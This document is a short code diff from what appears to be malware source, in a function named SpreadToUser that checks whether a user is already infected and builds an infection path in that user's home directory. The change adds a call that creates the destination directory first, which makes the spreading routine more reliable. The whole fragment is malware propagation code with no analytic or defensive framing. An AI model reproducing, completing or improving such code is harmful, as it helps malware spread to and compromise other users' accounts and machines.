@@ -472,6 +472,7 @@ BOOL SpreadToUser(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	if (IsUserInfected(dest_dir))
 		return FALSE;
 
+	FNC(CreateDirectoryW)(dest_dir, NULL);
 	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
 	FNC(CreateDirectoryW)(infection_path, NULL);
 
